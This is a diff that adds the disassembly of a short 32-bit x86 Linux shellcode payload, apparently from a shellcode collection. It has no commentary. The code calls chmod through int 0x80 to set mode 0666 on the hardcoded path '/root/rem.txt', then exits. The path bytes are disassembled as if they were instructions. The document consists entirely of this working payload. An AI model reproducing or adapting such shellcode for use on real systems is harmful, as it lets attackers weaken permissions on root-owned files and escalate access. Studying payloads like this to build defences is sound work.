@@ -1,0 +1,20 @@
+00000000  99                cdq
+00000001  6A0F              push byte +0xf
+00000003  58                pop eax
+00000004  52                push edx
+00000005  E80F000000        call 0x19
+0000000A  2F                das
+0000000B  726F              jc 0x7c
+0000000D  6F                outsd
+0000000E  742F              jz 0x3f
+00000010  7265              jc 0x77
+00000012  656D              gs insd
+00000014  2E7478            cs jz 0x8f
+00000017  7400              jz 0x19
+00000019  5B                pop ebx
+0000001A  68B6010000        push dword 0x1b6
+0000001F  59                pop ecx
+00000020  CD80              int 0x80
+00000022  6A01              push byte +0x1
+00000024  58                pop eax
+00000025  CD80              int 0x80
